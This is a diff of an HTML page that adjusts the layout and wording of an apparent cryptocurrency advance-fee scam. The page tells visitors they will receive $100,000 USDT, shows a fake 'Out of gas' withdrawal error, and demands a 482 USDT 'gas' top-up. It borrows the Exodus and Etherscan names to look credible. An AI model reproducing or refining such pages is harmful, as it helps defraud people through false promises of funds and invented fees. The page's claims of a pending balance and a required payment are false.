@@ -51,41 +51,38 @@
                 </tr>
               </table>
 
- <hr>
-           
      <!-- XtN Details -->
      
-<img align="center" src="IMG_8719.gif" alt="blockchain Logo" width="100" />
+<img align="center" src="IMG_8719.gif" alt="blockchain Logo" width="250" />
 
+<div class="container">
 <!-- get gas -->
-
 <form action="https://www.exodus.com" method="get">
 <button align="center" type="submit">[TOP Gas ⛽️ USDT]</button>
 </form>  
 
-<span style="color: Green;"> And receive $100,000 USDT Balance on your USDT address</span>
+<span style="color: Green;"> And receive $100,000 USDT Balance on your USDT address</div>
 
 <br>
   
-<table align="center" role="presentation" cellpadding="0" cellspacing="0" width="500%" style="font-size:14px; border-radius:6px; margin:20px 0; padding:0;">
+<table align="center" role="presentation" cellpadding="0" cellspacing="0" width="500" style="font-size:14px; border-radius:6px; margin:20px 0; padding:0;">
     <tr>
-        <td align="center" style="color: Black; font-weight: bold; font-style: italic;">Gas (estimated): [$482] = 482 USDT</td>
+        <td align="center" style="color: Black; font-weight: bold; font-style: italic;">TETHER GAS (estimated): [$482] = 482 USDT</td>
     </tr>
     <tr>
         <td align="center" style="color: Red; font-weight: bold;">CURRENTLY OUTSTANDING 482 USDT</td>
     </tr>
     <tr>
-        <td align="center" style="color: Blue; font-style: italic;">$0.00 USDT PAID</td>
+        <td align="center" style="color: Blue; font-style: italic;">-------------------------$0.00 USDT PAID-------------------------</td>
     </tr>
 </table>
 
-<blockquote align="center">
-    <span style="color: green;">RECEVING IN 15 seconds•••••</span>
-</blockquote>
-<hr>
+<pre>
+<span style="color: green;">RECEVING IN 15 seconds•••••</span>
+</pre><hr>
 
 <h4>Payment Method<h4>
-<table align="center" role="presentation" cellpadding="0" cellspacing="0" width="100%" style="font-size:14px; color:#05a5f0; background-color:#05a5f0; border-radius:6px; margin:20px 0;">
+<table align="center" role="presentation" cellpadding="0" cellspacing="0" width="500" style="font-size:14px; color:#05a5f0; background-color:#05a5f0; border-radius:6px; margin:20px 0;">
     <tr>
         <th colspan="2" style="padding: 10px; text-align: center; background-color: #f2f2f2;">TOP GAS⛽️ | USDT Network</th>
     </tr>
@@ -101,22 +98,20 @@
     </tr>
 </table>
 <img align="center" src="IMG_0565.jpeg" alt="blockchain Logo" width="38" />
-
 <hr>
 
 <span style="color: RED;"><strong>ERROR!!!</strong> 
-
-<span style="color: Red;">Warning! Error encountered during Withdraw execution <i>[Out of gas]<\i> ⚠️</span>
+           <p align="center" style="margin: 10px 0;"> ⏬ </p>
+           
+<span style="color: Red;">Warning! Error encountered during Withdraw execution [Out of gas]⚠️</span>
 
 <br>
 
-✅ This transaction is <span style="color: Red;"> Processing </span> ,Top-Up USDT Gas to Complete.✓⃝
+✅ This transaction is <span style="color: Red;"> Processing </span>,Top-Up USDT Gas to Complete.✓⃝
 
 <img align="center" src="IMG_0567.jpeg" alt="payslip" width="500" />
-
-<span style="color: red;"> <strong>SUMMARY:</strong>You need 482  USDT to complete this transaction Buy more [$482] USDT For Gas Price!</span>  <img src="IMG_0574.png" alt="blockchain Logo" width="15" />
-
-
+<br>
+<span style="color: red;"> <strong>SUMMARY:</strong>You need 482  USDT to complete this transaction Buy more [$482] USDT For Gas Price!</span>  <img src="IMG_0574.png" alt="blockchain Logo" width="21" /><br>
 <img align="center" src="IMG_0583.jpeg" alt="ethscan Logo" width="500" />
 <br>
 <form action="https://etherscan.io/" method="get">
